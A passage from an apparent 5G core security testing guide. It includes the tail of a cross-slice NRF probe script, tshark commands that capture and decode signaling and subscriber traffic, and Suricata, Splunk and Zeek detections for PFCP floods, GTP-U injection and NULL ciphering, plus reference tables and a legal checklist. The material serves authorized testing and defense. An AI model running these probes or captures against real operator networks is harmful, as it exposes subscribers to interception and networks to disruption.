                 headers={'Authorization': 'Bearer REPLACE_WITH_YOUR_TOKEN'},
                 verify=False, timeout=5)

print(f'NRF query for slice {target_slice_sst} from slice {attacker_slice_sst}: {r.status_code}')
if r.status_code == 200 and r.json().get('nfInstance'):
    print('CRITICAL: Slice cross-talk — subscriber in slice A can enumerate slice B NFs')
elif r.status_code == 403:
    print('OK: NRF rejected cross-slice query')
```

### 15.4 Slice-Aware UPF Verification

```bash
# Capture GTP-U traffic and verify that slices use isolated UPFs
sudo tshark -i any -f 'udp port 2152' -Y 'gtp' -w /tmp/gtpu-slice.pcap

# Extract TEIDs and check if they cross slice boundaries
tshark -r /tmp/gtpu-slice.pcap -Y gtp -T fields \
  -e ip.src -e ip.dst -e gtp.teid | sort -u

# Expected: each slice has a distinct UPF IP
# Unexpected: same UPF IP handling traffic from multiple slices without isolation
```

---

## 16. Wireshark 5G Dissectors — tshark NGAP/PFCP/GTP

### 16.1 NGAP Dissection

```bash
# NGAP runs over SCTP port 38412 on N2 (gNB <-> AMF)
sudo tshark -i any -f 'sctp port 38412' -Y ngap -w /tmp/ngap.pcap

# Show full NGAP dissection
tshark -r /tmp/ngap.pcap -Y ngap -V | head -200

# Extract NGAP message types
tshark -r /tmp/ngap.pcap -Y ngap -T fields \
  -e frame.time -e ngap.procedure_code -e ngap.RAN_UE_NGAP_ID \
  -e ngap.AMF_UE_NGAP_ID 2>/dev/null

# NGAP procedure codes (3GPP TS 38.413 §9.6):
#   0  = AMFConfigurationUpdate
#   9  = InitialContextSetup
#   10 = InitialUEMessage
#   14 = NAS Transport
#   15 = NGSetup
#   19 = PathSwitchRequest
#   32 = UEContextRelease
#   36 = UplinkNASTransport
#   38 = DownlinkNASTransport
#   45 = PduSessionResourceSetup
```

### 16.2 PFCP Dissection

```bash
# PFCP runs over UDP 8805 on N4 (SMF <-> UPF)
sudo tshark -i any -f 'udp port 8805' -Y pfcp -w /tmp/pfcp.pcap

# Show PFCP message types and SEIDs
tshark -r /tmp/pfcp.pcap -Y pfcp -T fields \
  -e frame.time -e pfcp.msg_type_name -e pfcp.seid 2>/dev/null | head -30

# PFCP message types (3GPP TS 29.244 §7.4):
#   1  = Heartbeat Request
#   2  = Heartbeat Response
#   5  = PFCP Association Setup Request
#   6  = PFCP Association Setup Response
#   12 = PFCP Association Release Request
#   50 = PFCP Session Establishment Request
#   51 = PFCP Session Establishment Response
#   52 = PFCP Session Modification Request
#   53 = PFCP Session Modification Response
#   54 = PFCP Session Deletion Request
#   55 = PFCP Session Deletion Response
```

### 16.3 GTP-U Dissection

```bash
# GTP-U runs over UDP 2152 on N3 (gNB <-> UPF) and N9 (UPF <-> UPF)
sudo tshark -i any -f 'udp port 2152' -Y 'gtp_u || gtp' -w /tmp/gtpu.pcap

# Show GTP-U messages and TEIDs
tshark -r /tmp/gtpu.pcap -Y gtp -T fields \
  -e ip.src -e ip.dst -e gtp.teid -e gtp.version -e gtp.u.message_pdu_type 2>/dev/null \
  | sort -u | head -30

# Decode inner IP traffic (subscriber payload)
tshark -r /tmp/gtpu.pcap -Y 'gtp && gtp.u.message_pdu_type == 0' -V | head -100

# GTP-U message types (3GPP TS 29.281):
#   1   = Echo Request
#   2   = Echo Response
#   31  = Error Indication
#   254 = End Marker
#   255 = G-PDU (T-PDU, user data)
```

### 16.4 NAS-5GS Dissection

```bash
# NAS-5GS is encapsulated in NGAP on N1 (UE <-> AMF)
sudo tshark -i any -f 'sctp port 38412' -Y 'nas-5gs || ngap' -w /tmp/nas5gs.pcap

# Extract NAS message types
tshark -r /tmp/nas5gs.pcap -Y nas_5gs -T fields \
  -e frame.time -e nas_5gs.message_type -e _ws.col.Info 2>/dev/null | head -30

# NAS-5GS message types (3GPP TS 24.501 §9.7):
#   0x23 = Registration Request
#   0x24 = Registration Accept
#   0x2b = Authentication Request
#   0x2c = Authentication Response
#   0x2d = Authentication Reject
#   0x2f = Security Mode Command
#   0x30 = Security Mode Complete
#   0x31 = Security Mode Reject
#   0x5b = Downlink NAS Transport
#   0x5c = Uplink NAS Transport
#   0x5e = 5GMM Status
```

### 16.5 One-Shot Capture Pipeline

```bash
# Capture all 5GC signaling in one pass
sudo tshark -i any -f 'sctp port 38412 or sctp port 3868 or udp port 8805 or udp port 2152 or udp port 2123 or tcp port 443 or tcp port 7777' \
  -Y 'ngap || pfcp || gtp || nas-5gs || diameter || http2' \
  -w /tmp/5gc-full-$(date +%s).pcap

# Stream dissection
tshark -r /tmp/5gc-full-*.pcap -Y ngap -T fields -e frame.time -e ngap.procedure_code > /tmp/ngap-events.csv
tshark -r /tmp/5gc-full-*.pcap -Y pfcp -T fields -e frame.time -e pfcp.msg_type_name -e pfcp.seid > /tmp/pfcp-events.csv
tshark -r /tmp/5gc-full-*.pcap -Y gtp -T fields -e frame.time -e gtp.teid > /tmp/gtp-events.csv
```

---

## 17. Detection Engineering (Blue Side) — Suricata/Splunk for 5G

### 17.1 Suricata Rules for 5GC Signaling

```yaml
# /etc/suricata/rules/5gc-signaling.rules
# Detect PFCP from non-SMF source
alert udp $EXTERNAL_NET any -> $HOME_NET 8805 (msg:"5GC PFCP from non-SMF source"; \
  content:"|20|"; depth:1; \
  content:"|01|"; depth:1; offset:1; \
  classtype:attempted-dos; sid:5G000001; rev:1;)

# Detect PFCP Session Deletion flood
alert udp $EXTERNAL_NET any -> $HOME_NET 8805 (msg:"5GC PFCP Session Deletion Request"; \
  content:"|21 00 36|"; offset:0; depth:3; \
  threshold: type threshold, track by_src, count 50, seconds 10; \
  classtype:attempted-dos; sid:5G000002; rev:1;)

# Detect GTP-U injection (G-PDU from non-gNB source)
alert udp $EXTERNAL_NET any -> $HOME_NET 2152 (msg:"5GC GTP-U G-PDU from non-gNB source"; \
  content:"|30|"; depth:1; \
  content:"|ff|"; offset:1; depth:1; \
  classtype:trojan-activity; sid:5G000003; rev:1;)

# Detect GTP-C v1/v2 anomalies (oversized messages)
alert udp $EXTERNAL_NET any -> $HOME_NET 2123 (msg:"5GC GTP-C oversized message (potential fuzz)"; \
  dsize:>1400; \
  classtype:attempted-dos; sid:5G000004; rev:1;)

# Detect NGAP from unauthorized gNB
alert sctp $EXTERNAL_NET any -> $HOME_NET 38412 (msg:"5GC NGAP from unauthorized gNB"; \
  flow:to_server,established; \
  threshold: type threshold, track by_src, count 10, seconds 60; \
  classtype:trojan-activity; sid:5G000005; rev:1;)

# Detect N32 SEPP anomalous source (roaming peer spoofing)
alert tls $EXTERNAL_NET any -> $HOME_NET 443 (msg:"5GC SEPP N32 from non-roaming peer"; \
  tls.sni; content:"n32"; nocase; \
  threshold: type threshold, track by_src, count 20, seconds 60; \
  classtype:trojan-activity; sid:5G000006; rev:1;)

# Detect NAS NULL ciphering (NEA0/NIA0)
alert sctp $HOME_NET 38412 -> $EXTERNAL_NET any (msg:"5GC NAS NULL ciphering (NEA0) accepted"; \
  content:"|5e|"; depth:0; \
  content:"|00|"; offset:8; depth:1; \
  classtype:policy-violation; sid:5G000007; rev:1;)
```

### 17.2 Splunk SPL for 5GC Anomalies

```spl
# 5GC PFCP Session Deletion rate per source IP (detect DoS)
index=5gc sourcetype=tshark:pfcp msg_type IN ("Session Deletion Request")
| stats count as deletions by src_ip
| where deletions > 50
| sort -deletions

# 5GC NGAP unusual source gNBs
index=5gc sourcetype=tshark:ngap procedure_code=10
| lookup known_gnbs gnb_ip OUTPUT gnb_id
| search NOT gnb_id=*
| stats count by src_ip
| sort -count

# 5GC SBI unauthorized NF type (NRF query from unexpected NF)
index=5gc sourcetype=tshark:http2 uri="/nnrf-nfm/v1/nf-instances*"
| eval nf_type = case(match(uri, "AMF"), "AMF", match(uri, "SMF"), "SMF", match(uri, "UPF"), "UPF")
| stats dc(nf_type) as nf_types_queried by source_nf_id
| where nf_types_queried > 2
| sort -nf_types_queried

# 5GC NAS SUCI decryption attempts (anomalous SUCI rates)
index=5gc sourcetype=tshark:nas-5gs message_type=0x41 mobile_identity_type=5
| bucket _time span=1m
| stats dc(suci_scheme_output) as unique_sucis by _time amf_ip
| where unique_sucis > 100
```

### 17.3 Zeek (Bro) Analyzer for 5G

```zeek
# /opt/zeek/share/zeek/site/5gc.zeek
# Custom Zeek analyzer to log NGAP and PFCP events

@load ./base/protocols/sctp

event sctp_message(c: connection, is_orig: bool, seq: count, data: string) {
  if (c$id$resp_p == 38412) {
    # NGAP message — parse first byte to determine procedure
    local first_byte = data[0];
    Log::write(Zeek::LOG_NGAP, [
      $ts=network_time(),
      $uid=c$uid,
      $src=c$id$orig_h,
      $dst=c$id$resp_h,
      $msg_first_byte=first_byte
    ]);
  }
  if (c$id$resp_p == 8805) {
    # PFCP message — parse header for msg_type
    local flags = data[0] & 0xF0;
    local msg_type = data[1];
    Log::write(Zeek::LOG_PFCP, [
      $ts=network_time(),
      $uid=c$uid,
      $src=c$id$orig_h,
      $dst=c$id$resp_h,
      $msg_type=msg_type
    ]);
  }
}
```

### 17.4 Detection Engineering Checklist

| # | Detection | Source | Threshold | Severity |
|---|-----------|--------|-----------|----------|
| 1 | PFCP from non-SMF | tshark:pfcp | >0 | HIGH |
| 2 | PFCP Session Deletion flood | tshark:pfcp | >50/min/src | CRITICAL |
| 3 | GTP-U from non-gNB | tshark:gtp | >0 | HIGH |
| 4 | NGAP from unauthorized gNB | tshark:ngap | >0 | HIGH |
| 5 | SBI from unexpected NF type | tshark:http2 | >2 NF types/query | MEDIUM |
| 6 | NAS NULL ciphering (NEA0) | tshark:nas-5gs | >0 | HIGH |
| 7 | NAS NULL integrity (NIA0) | tshark:nas-5gs | >0 | CRITICAL |
| 8 | High SUCI rate (potential IMSI catcher) | tshark:nas-5gs | >100 SUCIs/min | MEDIUM |
| 9 | 5G-GUTI realloc rate anomaly | tshark:nas-5gs | <5s interval | MEDIUM |
| 10 | SEPP N32 from non-roaming peer | tshark:tls | >0 | HIGH |
| 11 | Slice cross-talk (cross-slice query) | tshark:http2 | >0 | HIGH |
| 12 | Silent SMS (empty TPDU) | tshark:nas-5gs | >0/subscriber/day | MEDIUM |

---

## 18. Quick Reference Cheat Sheet

### 18.1 5G Reference Points (3GPP TS 23.501)

| Reference Point | Between | Protocol | Purpose |
|----------------|---------|----------|---------|
| N1 | UE ↔ AMF | NAS-5GS | NAS signaling |
| N2 | gNB ↔ AMF | NGAP/SCTP | Radio + NAS signaling |
| N3 | gNB ↔ UPF | GTP-U/UDP | User plane |
| N4 | SMF ↔ UPF | PFCP/UDP | Session mgmt |
| N6 | UPF ↔ DN | IP | Data network |
| N7 | SMF ↔ PCF | SBI/HTTP-2 | Policy |
| N8 | AMF ↔ UDM | SBI/HTTP-2 | Subscriber data |
| N9 | UPF ↔ UPF | GTP-U/UDP | Inter-UPF |
| N10 | SMF ↔ UDM | SBI/HTTP-2 | Subscriber data |
| N11 | AMF ↔ SMF | SBI/HTTP-2 | Session mgmt |
| N12 | AMF ↔ AUSF | SBI/HTTP-2 | Authentication |
| N14 | AMF ↔ AMF | SBI/HTTP-2 | Inter-AMF |
| N22 | AMF ↔ NSSF | SBI/HTTP-2 | Slice selection |
| N32 | SEPP ↔ SEPP | HTTPS/JWS+JWE | Roaming interconnect |
| E2 | near-RT RIC ↔ gNB | E2AP/SCTP | RIC control |
| A1 | non-RT RIC ↔ near-RT RIC | HTTPS | Policy |
| O1 | SMO ↔ O-RU/O-DU/O-CU | NETCONF/REST | Operations |

### 18.2 5GC Network Functions

| NF | Role | 3GPP Spec |
|----|------|-----------|
| AMF | Access and Mobility Management | TS 29.518 |
| SMF | Session Management | TS 29.502 |
| UPF | User Plane Function | TS 29.244 |
| AUSF | Authentication Server | TS 29.509 |
| UDM | Unified Data Management | TS 29.503 |
| UDR | Unified Data Repository | TS 29.504 |
| PCF | Policy Control | TS 29.507 |
| NRF | Network Repository | TS 29.510 |
| NSSF | Network Slice Selection | TS 29.531 |
| NEF | Network Exposure | TS 29.522 |
| SEPP | Security Edge Protection Proxy | TS 29.500 |

### 18.3 Default Ports (Common)

| Service | Port | Protocol |
|---------|------|----------|
| AMF NGAP (N2) | 38412 | SCTP |
| SMF PFCP (N4) | 8805 | UDP |
| UPF GTP-U (N3) | 2152 | UDP |
| SGW GTP-C | 2123 | UDP |
| MME/HSS S6a | 3868 | SCTP (Diameter) |
| SBI HTTP/2 | 443 or 7777 | TCP |
| SEPP N32 | 443 | TCP (HTTPS) |
| near-RT RIC E2 | 36422 | SCTP |
| S1-MME (4G) | 36412 | SCTP |

### 18.4 Key 3GPP Specifications

| Spec | Title |
|------|-------|
| TS 23.501 | System Architecture for the 5G System |
| TS 23.502 | Procedures for the 5G System |
| TS 23.503 | Policy and Charging Control Framework |
| TS 24.501 | NAS Protocol for 5G |
| TS 29.244 | PFC (PFCP) |
| TS 29.281 | GTP-U |
| TS 29.274 | GTP-C v2 |
| TS 29.272 | Diameter S6a/S6d |
| TS 29.002 | MAP (SS7) |
| TS 29.500 | Service-Based Architecture (SBA) |
| TS 29.510 | NRF |
| TS 33.501 | 5G Security Architecture |
| TS 33.401 | 4G/LTE Security |
| TS 33.102 | 2G/3G Security |
| TS 38.413 | NGAP |

### 18.5 Key References (Papers & Reports)

| Year | Author | Title | Class |
|------|--------|-------|-------|
| 2014 | Karsten Nohl | "Mobile Self-Defense" (31C3) | SS7 exploitation |
| 2016 | Karsten Nohl | "SS7: Locate. Track. Manipulate." (BlackHat) | SS7 exploitation |
| 2017 | Positive Technologies | "Diameter: SS7 of the LTE Era" | Diameter |
| 2019 | Praetorian | "5G Standalone Core Vulnerabilities" | PFCP DoS |
| 2021 | Alonso et al. | "The 5G AIA/ARIA: Privacy in 5G Standalone" | SUCI/SUPI |
| 2023 | Positive Technologies | "5G Vulnerabilities 2023" (HITB) | SEPP / SBA |
| 2023 | R. Piqueras Jover | "5G Security Reloaded" | UE security framework |

### 18.6 Lab Cost Summary

| Component | Cost (USD) | Notes |
|-----------|------------|-------|
| Open5GS | Free | Open-source 5GC |
| UERANSIM | Free | UE/gNB simulator |
| srsRAN | Free | 5G gNB software |
| PacketRusher | Free | Load/fuzz tester |
| Linux server | ~$500 | 16-core, 32GB RAM minimum |
| USRP B210 | ~$1,400 | Reference SDR for RF |
| BladeRF 2.0 micro | ~$480 | Lower-cost SDR |
| **Total lab** | **~$2,000** | Software-defined radio + server |

### 18.7 One-Line Bring-Up (Lab)

```bash
# One-shot lab bring-up
git clone https://github.com/open5gs/open5gs /opt/open5gs && \
  cd /opt/open5gs/docker && docker compose up -d && \
  git clone https://github.com/aligungr/UERANSIM /opt/UERANSIM && \
  cd /opt/UERANSIM && make -j$(nproc) && \
  ./nr-gnb -c config/open5gs-gnb.yaml & \
  ./nr-ue -c config/open5gs-ue.yaml
```

### 18.8 Pre-Engagement Legal Checklist

- [ ] Frequency license obtained (for any transmission on licensed cellular bands)
- [ ] Operator written authorization (for any operator-side testing)
- [ ] Roaming partner written authorization (for any SS7/Diameter/SEPP testing)
- [ ] Scope explicitly states: production vs. test, RAN vs. 5GC vs. interconnect
- [ ] Blast-radius ceiling documented (no subscriber impact, max sessions to test, etc.)
- [ ] Disclosure path agreed (GSMA FS-IS, 3GPP SA3, operator's CSIRT)
- [ ] Regulator notification path identified (EU NIS2, US FCC, national CERT)
- [ ] Capture/retention policy for subscriber data confirmed
- [ ] No real subscriber IMSI/SUPI/K/OPc used — test PLMN 001/01 only
